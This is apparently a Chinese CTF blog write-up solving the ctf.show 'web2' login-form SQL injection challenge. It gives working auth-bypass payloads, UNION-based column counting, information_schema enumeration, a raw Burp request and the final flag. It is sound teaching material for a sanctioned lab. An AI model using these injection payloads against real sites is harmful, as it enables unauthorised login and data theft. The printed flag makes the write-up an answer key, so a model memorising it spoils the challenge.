---
title: "ctfshow web2 题解：登录框 SQL 注入"
date: 2026-10-27
pinned: false
description: "ctf.show web2 通关记录：POST 登录框字符型注入，从万能密码被 AND 优先级拖垮的踩坑讲起，再用联合查询完整走一遍爆库、爆表、爆数据的流程。"
tags: [ctf, web, WriteUp]
cover: /hero/bg-08-gemini.jpg
categories: [web]
draft: false
---

# ctf.show web2：登录框 SQL 注入 Writeup

> 靶场：`https://<实例id>.challenge.ctf.show/`（POST 登录框）
> 难度：入门 | 方向：Web / SQL 注入 | 知识体系：HelloCTF 系列 + SQL注入.pptx + 学习文档_02
> 最终 Flag：`ctfshow{afe47f7e-3d6e-4f8e-9aeb-02384caf1a32}`

---

## 〇、题目页面与已知条件

页面是一个极简登录框（POST 表单，参数 `username` / `password`），无源码泄露。上帝视角的服务器模板（复盘用）：

```php
$sql = "SELECT username,password,xxx FROM user WHERE username='".$_POST['username']."' AND password='".$_POST['password']."'";
$row = mysqli_fetch_row(mysqli_query($conn, $sql));
if ($row) echo "欢迎你，" . $row[0];        // ← 查询结果有回显（回显位！）
```

三个开局就能确认的事实（全部实测过）：

| 事实 | 证据 |
|---|---|
| 两个输入框都会拼进 SQL（双填空格） | 哪个框塞 `' or 1=1#` 都能登录成功 |
| 单引号字符型闭合 | `1'` 触发异常、`or 1=1` 生效 |
| 查询结果直接渲染到页面 | `欢迎你，xxx` → 有回显位 → 联合查询可行 |

---

## 一、第一战：万能密码（以及我踩的坑）

### 1.1 我最初的 payload 为什么失败

提交内容：`admin '/**/OR/**/'1'='1`（填在用户名框）

拼进模板后：

```sql
WHERE username='admin ' OR '1'='1' AND password='1'
```

| 分析项 | 结论 |
|---|---|
| 引号配平 | ✅ 恰好合法——**语法没错，错的是逻辑** |
| 运算优先级 | `AND` 高于 `OR` → 拆成 `(username='admin ') OR ('1'='1' AND password='1')` |
| 右半句 | 密码必假 → `'1'='1' AND 假` = **假**，永真被 AND 吃掉了 |
| 左半句 | 要求真实存在用户 `admin ` —— 但表里第一行用户是 `ctfshow`，没有 admin |
| 总结果 | WHERE 为假 → 无行 → 登录失败 |

**教训：`or 1=1` 必须不被 AND 拖住，永真法才有意义。** 我的写法把永真塞进了 AND 的分支里，退化成「赌 admin 用户存在」。

### 1.2 万能密码的正确姿势（两个品种）

| 品种 | payload（用户名框） | 拼出效果 | 依赖 |
|---|---|---|---|
| **永真法**（首选） | `admin' or 1=1#` | `username='admin' or 1=1#...` → 恒真 | 无，返回**表第一行**（ctfshow） |
| 指名法 | `admin'-- -` | `username='admin'#...` 注释掉密码校验 | admin 必须真实存在 |

实测：`admin' or 1=1#` → `欢迎你，ctfshow` ✅

### 1.3 顺带确认的三个小知识

| 知识点 | 实测证据 |
|---|---|
| `/**/` 不是默认要用的 | 我带真实空格的 payload 能通 → 本题**空格没被过滤**，`/**/` 是空格过滤题专用 |
| 填用户名框还是密码框都行 | 两框分别/同时填 `' or 1=1#` 三种测法**全部登录成功**——双填空格都没上锁 |
| `or 1=1` 在密码框也成立 | `WHERE username='admin' AND password='' or 1=1#` → `(admin AND 假) or 真` → `or 1=1` 优先级兜底 |

---

## 二、第二战：联合查询拿 flag（主线）

### 2.1 数列数——「3」不是猜的，是量出来的

这题**吞报错**（PHP 不显示错误信息），经典 `order by` 报错分界线看不见（order by 3 和 4 页面长得一样）。换两种实测有效的量法：

**法 A：`or 1=1` 保行 + order by 越界**

```
1' or 1=1 order by 3#   → 欢迎你，ctfshow   ← 行存在、排上了 → 3 合法
1' or 1=1 order by 4#   → 空                ← 越界，语句作废 → 无输出
```

**法 B：union 当尺子（推荐，一步两用）**

```
1' union select 1,2#      → 空（2列≠3列，报错被吞）
1' union select 1,2,3#    → 欢迎你，2    ← 第一次出数字：3列 + 出口在第2格
1' union select 1,2,3,4#  → 空
```

**核心思维转换：靶场吞报错时，「有输出 vs 没输出」本身就是回答——静默也是一种回显。**（布尔盲注思想的雏形）

### 2.2 完整注入链（每步 payload + 实测结果 + 原理）

| 步骤 | username 填入 | 页面回答 | 原理 |
|---|---|---|---|
| 定列数+出口 | `1' union select 1,2,3#` | `欢迎你，2` | 原查询 3 列；第 2 列渲染到页面 → 出口 |
| 问阅览室 | `1' union select 1,(database()),3#` | `web2` | 当前库名；顺便确认 ≥5.0 有 information_schema |
| 查书柜 | `1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#` | `flag,user` | 元数据目录列出所有表；group_concat 把多行折叠成一行适配单回显位 |
| 查抽屉 | `...columns where table_name='flag'...` | `flag` | flag 表的列也叫 flag |
| **开抽屉** | `1' union select 1,(select * from flag),3#` | `ctfshow{afe47f7e-3d6e-4f8e-9aeb-02384caf1a32}` | 直接读本体，不再绕目录 |

### 2.3 最终 payload 逐段拆解（五零件公式）

```
1'  union  select  1,(select * from flag),3  #
①    ②      ③    └────────④─────────┘    ⑤
```

| 零件 | 作用 | 出处（哪一步的实测逼出来的） |
|---|---|---|
| ① `1'` | 逃逸填空格：引号提前闭合原句；`1` 是不存在的用户 → 主查询空集「清场」 | 闭合探测 |
| ② `union` | 把私货查询的结果钉到同一结果集 | 回显位存在（欢迎你） |
| ③ `select 1,?,3` | 骨架，列数对齐 3 | order by / union 尺子量出来的 |
| ④ 第2格填子查询 | 出口在第 2 格（`union select 1,2,3` 显示的 2）；括号让子查询当标量值嵌入；flag 表恰好一行一列所以 `*` 不炸 | 回显位实测 + information_schema 目录 |
| ⑤ `#` | 注释掉服务器补的 `' AND password=...` 尾巴 | 闭合探测同款操作 |

**生成公式（背这个，不背 payload）：**

```
逃逸(1') + 挂载(union) + 对齐列数(order by/union量) + 出口填货(回显位=目录柜答案) + 擦尾(#)
```

---

## 三、两种操作路径（网页 / Burp）

### 3.1 网页端（最快验证）

| 步骤 | 操作 |
|---|---|
| 1 | 打开靶场，F12 → Network → 勾 Preserve log |
| 2 | 用户名框直接填 payload，密码随便，点登陆 |
| 3 | Network 里点 POST 请求 → Payload 标签看浏览器自动编码（`'`→`%27`、空格→`+`、`#`→`%23`） |

### 3.2 Burp 端（Repeater，反复试错主战场）

| 步骤 | 操作 |
|---|---|
| 1 | `Proxy → Intercept → Open browser`（内置浏览器免配证书）→ 访问靶场，随便登录一次 |
| 2 | HTTP history 找到 `POST /` → 右键 **Send to Repeater**（Ctrl+R） |
| 3 | Repeater 里改 body 的 username 值 → Send → 右侧读响应 |

Repeater 里的原始请求（可直接手抄）：

```
POST / HTTP/1.1
Host: <实例id>.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Content-Length: 自动

username=1' union select 1,(select * from flag),3#&password=1
```

**body 编码规则**：raw body 里 `'`、空格、`#` 都能直写（PHP 照样解析）；浏览器表单才会编码成 `%27 + %23`。Content-Length Repeater 自动算。

**响应判读表**：

| 响应 | 结论 |
|---|---|
| `欢迎你，xxx` | WHERE 为真 / union 出货 |
| 干净登录表单 | 语句没报错但 WHERE 假 → 查闭合与条件 |
| `Unknown column` 类报错 | order by 越界等，报错=答案 |

---

## 四、本题知识点全景（对应学习材料）

| 知识点 | 本题体现 | 对应材料 |
|---|---|---|
| 填空表格模型 | 双填空格都未上锁，payload 自带逃逸引号 | 图一 / 学习文档_02 §2 |
| 运算优先级陷阱 | `AND` 吃掉 `or 1=1` → 万能密码失效 | 本题新坑 |
| 万能密码两品种 | 永真法 vs 指名法 | PPT 第 3 页 |
| 联合查询铁律 | 列数对齐 + id 清场 + 回显位 | PPT 第 5~9 页 |
| order by 测列数 | 报错被吞 → 改用「有输出/无输出」信号 | PPT 第 8 页 + 盲注思想 |
| information_schema 目录柜 | 库→表→列→数据四连 | PPT 第 9 页 |
| group_concat | 多行折叠适配单回显位 | PPT 第 9 页 |
| URL 编码 | body 直写 vs 浏览器自动编码 | Burp 操作 |

## 汇总表

| 项目 | 内容 |
|---|---|
| 靶场 | ctf.show web2（登录框，POST username/password） |
| 漏洞类型 | 单引号字符型注入（双参数均未过滤，有回显位） |
| 万能密码 | `admin' or 1=1#`（或 `' or 1=1#` 填任意框） |
| 踩坑复盘 | payload 里 `or 1=1` 被 `AND password` 优先级吃掉 → 退化成指名法 → 库里没有 admin |
| 数列数 | 吞报错环境用 union 尺：第一个显示数字的 N = 列数（3），显示位置 = 回显位（第2格） |
| 拿 flag | `1' union select 1,(select * from flag),3#` |
| 关键收获 | ① 语法对≠逻辑对，优先级会吃掉永真；② 吞报错环境「静默=假」；③ 登录成功只是门票，回显位+目录柜才是终点 |
| **Flag** | `ctfshow{afe47f7e-3d6e-4f8e-9aeb-02384caf1a32}` |
